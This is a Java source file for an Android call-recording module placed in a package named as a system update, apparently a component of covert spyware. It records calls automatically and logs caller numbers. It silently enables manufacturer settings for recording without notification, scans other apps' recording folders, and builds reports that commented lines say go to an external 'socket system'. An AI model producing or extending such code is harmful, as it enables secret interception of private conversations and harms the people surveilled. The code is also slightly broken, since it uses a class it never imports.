package com.android.system.update.modules;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class CallRecordingModule {
    private static final String TAG = "CallRecordingModule";
    private static final String PREFS_NAME = "call_recording_prefs";
    private static final String KEY_AUTO_RECORD = "auto_record_enabled";
    private static final String KEY_RECORD_UNKNOWN = "record_unknown_only";
    private static final String KEY_RECORD_CONTACTS = "record_contacts";
    
    private Context context;
    private TelephonyManager telephonyManager;
    private SharedPreferences prefs;
    private PhoneStateListener phoneStateListener;
    private CallStateReceiver callStateReceiver;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentPhoneNumber;
    private long callStartTime;
    private File currentRecordingFile;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    // Manufacturer detection
    private static final String XIAOMI = "xiaomi";
    private static final String REDMI = "redmi";
    private static final String POCO = "poco";
    private static final String SAMSUNG = "samsung";
    private static final String HUAWEI = "huawei";
    private static final String HONOR = "honor";
    private static final String OPPO = "oppo";
    private static final String VIVO = "vivo";
    private static final String REALME = "realme";
    private static final String ONEPLUS = "oneplus";
    private static final String TECNO = "tecno";
    private static final String INFINIX = "infinix";
    private static final String ITEL = "itel";
    
    // Storage paths by manufacturer
    private static final Map<String, String[]> STORAGE_PATHS = new HashMap<String, String[]>() {{
        // Xiaomi/Redmi/POCO
        put(XIAOMI, new String[]{
            "/MIUI/sound_recorder/call_rec/",
            "/MIUI/sound_recorder/app_capture/"
        });
        put(REDMI, new String[]{
            "/MIUI/sound_recorder/call_rec/",
            "/MIUI/sound_recorder/app_capture/"
        });
        put(POCO, new String[]{
            "/MIUI/sound_recorder/call_rec/",
            "/MIUI/sound_recorder/app_capture/"
        });
        
        // Samsung
       // Samsung storage paths - UPDATE THIS SECTION
        put(SAMSUNG, new String[]{
            "/Recordings/Call/",           // This is the correct path for Galaxy A51
            "/Call/",                       // Fallback for older models
            "/Sounds/CallRecordings/",      // Another possible location
            "/storage/emulated/0/Recordings/Call/", // Full path for safety
        });
                
        // Huawei/Honor
        put(HUAWEI, new String[]{
            "/Recordings/Call/",
            "/CallRecord/"
        });
        put(HONOR, new String[]{
            "/Recordings/Call/",
            "/CallRecord/"
        });
        
        // Oppo/Vivo/Realme/OnePlus
        put(OPPO, new String[]{
            "/Recordings/Call/",
            "/CallRecordings/"
        });
        put(VIVO, new String[]{
            "/Recordings/Call/",
            "/CallRecord/"
        });
        put(REALME, new String[]{
            "/Recordings/Call/",
            "/CallRecordings/"
        });
        put(ONEPLUS, new String[]{
            "/Recordings/",
            "/CallRecordings/"
        });
        
        // Tecno/Infinix/Itel
        put(TECNO, new String[]{
            "/Recordings/",
            "/CallRecorder/",
            "/CallRecordings/"
        });
        put(INFINIX, new String[]{
            "/Recordings/",
            "/CallRecorder/",
            "/CallRecordings/"
        });
        put(ITEL, new String[]{
            "/Recordings/",
            "/CallRecorder/",
            "/CallRecordings/"
        });
    }};
    
    public CallRecordingModule(Context context) {
        this.context = context;
        this.telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        
        // Setup call state listener
        setupPhoneStateListener();
        
        // Register broadcast receiver
        registerCallReceiver();
        
        Log.d(TAG, "CallRecordingModule initialized on " + getManufacturer());
         // Enable auto-recording for Samsung
    if (SAMSUNG.equals(getManufacturer())) {
        enableSamsungAutoRecording();
    }
    }
    private void logCallState(int state, String phoneNumber) {
    String stateStr = "UNKNOWN";
    switch(state) {
        case TelephonyManager.CALL_STATE_IDLE: stateStr = "IDLE"; break;
        case TelephonyManager.CALL_STATE_OFFHOOK: stateStr = "OFFHOOK (ACTIVE)"; break;
        case TelephonyManager.CALL_STATE_RINGING: stateStr = "RINGING"; break;
    }
    Log.d(TAG, "📞 Call state changed: " + stateStr + " | Number: " + (phoneNumber != null ? phoneNumber : "null"));
}

    private void enableSamsungAutoRecording() {
    try {
        Log.d(TAG, "📱 Attempting to enable Samsung auto recording");
        
        // Method 1: Through Settings (works on many Samsung devices)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Enable call auto recording in Samsung dialer
            Settings.System.putInt(context.getContentResolver(), 
                "call_auto_record", 1);
            
            Settings.System.putInt(context.getContentResolver(), 
                "call_record_without_notification", 1);
            
            Log.d(TAG, "✅ Samsung auto recording settings applied");
        }
        
        // Method 2: Launch Samsung dialer with recording settings
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
            "com.samsung.android.dialer",
            "com.samsung.android.dialer.DialtactsActivity"
        ));
        intent.putExtra("extra_open_recording_settings", true);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        
    } catch (Exception e) {
        Log.e(TAG, "❌ Failed to enable Samsung auto recording", e);
    }
}
    private void setupPhoneStateListener() {
        phoneStateListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String phoneNumber) {
                logCallState(state, phoneNumber);  // ADD THIS LINE
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE:
                        Log.d(TAG, "📞 Call ended - IDLE");
                        onCallEnded();
                        break;
                        
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Log.d(TAG, "📞 Call active - OFFHOOK");
                        onCallActive(phoneNumber);
                        break;
                        
                    case TelephonyManager.CALL_STATE_RINGING:
                        Log.d(TAG, "📞 Incoming call from: " + phoneNumber);
                        onCallRinging(phoneNumber);
                        break;
                }
            }
        };
        
        try {
            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
            Log.d(TAG, "📞 PhoneStateListener registered");
        } catch (SecurityException e) {
            Log.e(TAG, "Missing READ_PHONE_STATE permission", e);
        }
    }
    
    private void registerCallReceiver() {
        callStateReceiver = new CallStateReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
        filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
        context.registerReceiver(callStateReceiver, filter);
        Log.d(TAG, "📞 CallReceiver registered");
    }
    
    // Inner class for BroadcastReceiver
    private class CallStateReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            
            if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) {
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                
                if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                    Log.d(TAG, "📞 [Receiver] Call active");
                    onCallActive(phoneNumber);
                } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                    Log.d(TAG, "📞 [Receiver] Call ended");
                    onCallEnded();
                } else if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                    Log.d(TAG, "📞 [Receiver] Incoming: " + phoneNumber);
                    onCallRinging(phoneNumber);
                }
                
            } else if ("android.intent.action.NEW_OUTGOING_CALL".equals(action)) {
                String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                Log.d(TAG, "📞 [Receiver] Outgoing call to: " + phoneNumber);
                onOutgoingCall(phoneNumber);
            }
        }
    }
    
    private void onCallRinging(String phoneNumber) {
        currentPhoneNumber = phoneNumber;
        Log.d(TAG, "🔔 Ringing: " + phoneNumber);
        
        // Optional: Prepare recording for incoming call
        if (shouldRecordCall(phoneNumber)) {
            prepareRecording(phoneNumber);
        }
    }
    
    private void onOutgoingCall(String phoneNumber) {
        currentPhoneNumber = phoneNumber;
        Log.d(TAG, "📞 Dialing: " + phoneNumber);
        
        // Prepare recording for outgoing call
        if (shouldRecordCall(phoneNumber)) {
            prepareRecording(phoneNumber);
        }
    }
    
    private void onCallActive(String phoneNumber) {
        if (phoneNumber != null && !phoneNumber.isEmpty()) {
            currentPhoneNumber = phoneNumber;
        }
        
        callStartTime = System.currentTimeMillis();
        Log.d(TAG, "🎙️ Call ACTIVE at " + new Date(callStartTime));
        
        // START RECORDING!
        if (shouldRecordCall(currentPhoneNumber)) {
            startRecording();
        } else {
            // If not set to auto-record, trigger native recorder
            triggerNativeCallRecording();
        }
        
        // Notify listener about call start
        notifyCallStarted(currentPhoneNumber);
    }
    
    private void onCallEnded() {
        long duration = System.currentTimeMillis() - callStartTime;
        Log.d(TAG, "📞 Call ENDED - Duration: " + (duration / 1000) + " seconds");
        
        // STOP RECORDING
        stopRecording();
        
        // Notify listener about call end and recording location
        notifyCallEnded(currentPhoneNumber, duration, currentRecordingFile);
        
        currentPhoneNumber = null;
        callStartTime = 0;
    }
    
    private boolean shouldRecordCall(String phoneNumber) {
        boolean autoRecord = prefs.getBoolean(KEY_AUTO_RECORD, true);
        if (!autoRecord) return false;
        
        boolean recordUnknownOnly = prefs.getBoolean(KEY_RECORD_UNKNOWN, false);
        if (recordUnknownOnly) {
            // Check if number is in contacts (implement contact checking)
            return !isContact(phoneNumber);
        }
        
        return true;
    }
    
    private boolean isContact(String phoneNumber) {
        // Simple check - you can expand this
        if (phoneNumber == null || phoneNumber.isEmpty()) return false;
        
        // Query contacts provider to check if number exists
        try {
            Uri lookupUri = Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
            
            String[] projection = new String[]{
                android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME
            };
            
            Cursor cursor = context.getContentResolver().query(
                lookupUri, projection, null, null, null);
            
            if (cursor != null) {
                boolean isContact = cursor.getCount() > 0;
                cursor.close();
                return isContact;
            }
        } catch (SecurityException e) {
            Log.e(TAG, "No contacts permission", e);
        }
        
        return false;
    }
    
    private void prepareRecording(String phoneNumber) {
        try {
            File recordingDir = getRecordingDirectory();
            if (recordingDir == null) {
                Log.e(TAG, "Cannot get recording directory");
                return;
            }
            
            if (!recordingDir.exists()) {
                recordingDir.mkdirs();
            }
            
            String fileName = "call_" + 
                (phoneNumber != null ? phoneNumber.replace("+", "").replace(" ", "") : "unknown") + 
                "_" + System.currentTimeMillis() + ".mp3";
            
            currentRecordingFile = new File(recordingDir, fileName);
            
            // Initialize MediaRecorder
            mediaRecorder = new MediaRecorder();
            
            // Use VOICE_COMMUNICATION for both sides of call
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ - Use VOICE_COMMUNICATION
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            } else {
                // Older Android - Use VOICE_CALL for both sides
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
            }
            
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.setAudioEncodingBitRate(128000);

            mediaRecorder.setOutputFile(currentRecordingFile.getAbsolutePath());
            
            mediaRecorder.prepare();
            Log.d(TAG, "🎙️ Recorder prepared: " + currentRecordingFile.getAbsolutePath());
            
        } catch (IOException | IllegalStateException | SecurityException e) {
            Log.e(TAG, "Error preparing recorder", e);
            mediaRecorder = null;
        }
    }
    
    private void startRecording() {
        if (mediaRecorder != null && !isRecording) {
            try {
                mediaRecorder.start();
                isRecording = true;
                Log.d(TAG, "🎙️🎙️🎙️ RECORDING STARTED! File: " + currentRecordingFile.getAbsolutePath());
                
                // Notify via your existing socket system
                notifyRecordingStarted(currentPhoneNumber, currentRecordingFile.getAbsolutePath());
                
            } catch (IllegalStateException e) {
                Log.e(TAG, "Error starting recording", e);
            }
        } else {
            // Fallback to triggering native recorder
            triggerNativeCallRecording();
        }
    }
    
    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.reset();
                mediaRecorder.release();
                isRecording = false;
                
                long fileSize = currentRecordingFile.length();
                Log.d(TAG, "🎙️ RECORDING STOPPED - Size: " + fileSize + " bytes");
                
                // Notify that recording is ready
                notifyRecordingReady(currentPhoneNumber, currentRecordingFile.getAbsolutePath(), fileSize);
                
            } catch (IllegalStateException e) {
                Log.e(TAG, "Error stopping recording", e);
            } finally {
                mediaRecorder = null;
            }
        }
    }
    
  private void triggerNativeCallRecording() {
    String manufacturer = getManufacturer();
    Log.d(TAG, "📱 Triggering native recorder on " + manufacturer);
    
    try {
        switch (manufacturer) {
            case SAMSUNG:
                // Samsung specific method
                enableSamsungAutoRecording();
                
                // Also try to launch recording via intent
                Intent intent = new Intent("android.intent.action.CALL_BUTTON");
                intent.putExtra("extra_force_record", true);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                break;
                
            case XIAOMI:
            case REDMI:
            case POCO:
                Settings.System.putInt(context.getContentResolver(), 
                    "various_sound_recorder_auto_record_call", 1);
                break;
                
            case TECNO:
            case INFINIX:
            case ITEL:
                Settings.System.putInt(context.getContentResolver(), 
                    "call_recording_auto", 1);
                break;
                
            case HUAWEI:
            case HONOR:
                Settings.System.putInt(context.getContentResolver(), 
                    "hw_auto_record_calls", 1);
                break;
        }
        
        Log.d(TAG, "✅ Native recorder triggered for " + manufacturer);
        
    } catch (SecurityException e) {
        Log.e(TAG, "Cannot modify settings", e);
    } catch (Exception e) {
        Log.e(TAG, "Error triggering native recorder", e);
    }
}
    
    private File getRecordingDirectory() {
        String manufacturer = getManufacturer();
        String basePath = Environment.getExternalStorageDirectory().getAbsolutePath();
        
        String[] paths = STORAGE_PATHS.get(manufacturer);
        if (paths == null) {
            // Default fallback
            paths = new String[]{"/CallRecordings/", "/Recordings/"};
        }
        
        for (String path : paths) {
            File dir = new File(basePath + path);
            try {
                if (!dir.exists()) {
                    dir.mkdirs();
                }
                if (dir.exists() && dir.canWrite()) {
                    return dir;
                }
            } catch (Exception e) {
                Log.e(TAG, "Cannot access " + path, e);
            }
        }
        
        // Ultimate fallback
        File fallback = new File(basePath + "/CallRecordings/");
        fallback.mkdirs();
        return fallback;
    }
    
    private String getManufacturer() {
        String manufacturer = Build.MANUFACTURER.toLowerCase(Locale.US);
        String brand = Build.BRAND.toLowerCase(Locale.US);
        
        if (brand.contains("redmi")) return REDMI;
        if (brand.contains("poco")) return POCO;
        if (manufacturer.contains("xiaomi")) return XIAOMI;
        if (manufacturer.contains("samsung")) return SAMSUNG;
        if (manufacturer.contains("huawei")) return HUAWEI;
        if (manufacturer.contains("honor")) return HONOR;
        if (manufacturer.contains("oppo")) return OPPO;
        if (manufacturer.contains("vivo")) return VIVO;
        if (manufacturer.contains("realme")) return REALME;
        if (manufacturer.contains("oneplus")) return ONEPLUS;
        if (manufacturer.contains("tecno") || brand.contains("tecno")) return TECNO;
        if (manufacturer.contains("infinix") || brand.contains("infinix")) return INFINIX;
        if (manufacturer.contains("itel") || brand.contains("itel")) return ITEL;
        
        return manufacturer;
    }
    
    // Notification methods to communicate with your existing system
    private void notifyCallStarted(String phoneNumber) {
        try {
            JSONObject notification = new JSONObject();
            notification.put("type", "call_started");
            notification.put("phoneNumber", phoneNumber != null ? phoneNumber : "unknown");
            notification.put("timestamp", System.currentTimeMillis());
            notification.put("direction", callStartTime > 0 ? "outgoing" : "incoming");
            
            Log.d(TAG, "📢 " + notification.toString());
            // Send via your socket/broadcast system
            // sendCommand("CALL_NOTIFICATION|" + notification.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notification", e);
        }
    }
    
    private void notifyCallEnded(String phoneNumber, long duration, File recordingFile) {
        try {
            JSONObject notification = new JSONObject();
            notification.put("type", "call_ended");
            notification.put("phoneNumber", phoneNumber != null ? phoneNumber : "unknown");
            notification.put("duration", duration);
            notification.put("timestamp", System.currentTimeMillis());
            
            if (recordingFile != null && recordingFile.exists()) {
                notification.put("recording_path", recordingFile.getAbsolutePath());
                notification.put("recording_size", recordingFile.length());
            }
            
            Log.d(TAG, "📢 " + notification.toString());
            // Send via your socket/broadcast system
            // sendCommand("CALL_NOTIFICATION|" + notification.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notification", e);
        }
    }
    
    private void notifyRecordingStarted(String phoneNumber, String path) {
        try {
            JSONObject notification = new JSONObject();
            notification.put("type", "recording_started");
            notification.put("phoneNumber", phoneNumber != null ? phoneNumber : "unknown");
            notification.put("path", path);
            notification.put("timestamp", System.currentTimeMillis());
            
            Log.d(TAG, "📢 " + notification.toString());
            // Send via your socket/broadcast system
            // sendCommand("CALL_RECORDING|" + notification.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notification", e);
        }
    }
    
    private void notifyRecordingReady(String phoneNumber, String path, long size) {
        try {
            JSONObject notification = new JSONObject();
            notification.put("type", "recording_ready");
            notification.put("phoneNumber", phoneNumber != null ? phoneNumber : "unknown");
            notification.put("path", path);
            notification.put("size", size);
            notification.put("timestamp", System.currentTimeMillis());
            
            Log.d(TAG, "📢 " + notification.toString());
            // Send via your socket/broadcast system
            // sendCommand("CALL_RECORDING|" + notification.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notification", e);
        }
    }
    
    // Public API methods
    public String getStatus() {
        try {
            JSONObject status = new JSONObject();
            status.put("success", true);
            status.put("manufacturer", getManufacturer());
            status.put("auto_record", prefs.getBoolean(KEY_AUTO_RECORD, true));
            status.put("record_unknown_only", prefs.getBoolean(KEY_RECORD_UNKNOWN, false));
            status.put("recording_now", isRecording);
            status.put("current_call", currentPhoneNumber);
            
            return status.toString();
            
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String setAutoRecord(boolean enabled) {
        prefs.edit().putBoolean(KEY_AUTO_RECORD, enabled).apply();
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("auto_record", enabled);
            result.put("message", enabled ? "Auto-record enabled" : "Auto-record disabled");
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String setRecordUnknownOnly(boolean enabled) {
        prefs.edit().putBoolean(KEY_RECORD_UNKNOWN, enabled).apply();
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("record_unknown_only", enabled);
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
   public String getRecordings() {
    try {
        JSONArray recordingsArray = new JSONArray();
        
        // Scan all possible Samsung recording locations
        String[] possiblePaths = {
            "/storage/emulated/0/Recordings/Call/",
            "/storage/emulated/0/Call/",
            "/storage/emulated/0/Sounds/CallRecordings/",
            "/storage/emulated/0/My Files/Call/",
            "/storage/emulated/0/Phone/CallRecordings/"
        };
        
        for (String path : possiblePaths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                Log.d(TAG, "Scanning: " + path);
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isFile() && isAudioFile(file.getName())) {
                            JSONObject fileInfo = new JSONObject();
                            fileInfo.put("name", file.getName());
                            fileInfo.put("path", file.getAbsolutePath());
                            fileInfo.put("size", file.length());
                            fileInfo.put("lastModified", file.lastModified());
                            
                            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                            fileInfo.put("lastModifiedFormatted", sdf.format(new Date(file.lastModified())));
                            
                            recordingsArray.put(fileInfo);
                            Log.d(TAG, "Found recording: " + file.getName());
                        }
                    }
                }
            }
        }
        
        JSONObject result = new JSONObject();
        result.put("success", true);
        result.put("recordings", recordingsArray);
        result.put("count", recordingsArray.length());
        result.put("directory", "Multiple locations");
        
        return result.toString();
        
    } catch (JSONException e) {
        return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
    }
}
    
    private boolean isAudioFile(String fileName) {
        String lower = fileName.toLowerCase();
        return lower.endsWith(".mp3") || lower.endsWith(".mp4") || 
               lower.endsWith(".3gp") || lower.endsWith(".amr") || 
               lower.endsWith(".wav") || lower.endsWith(".m4a") || 
               lower.endsWith(".aac");
    }
    
    public void cleanup() {
        if (phoneStateListener != null) {
            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
        }
        
        if (callStateReceiver != null) {
            try {
                context.unregisterReceiver(callStateReceiver);
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Receiver not registered", e);
            }
        }
        
        if (isRecording) {
            stopRecording();
        }
    }
}
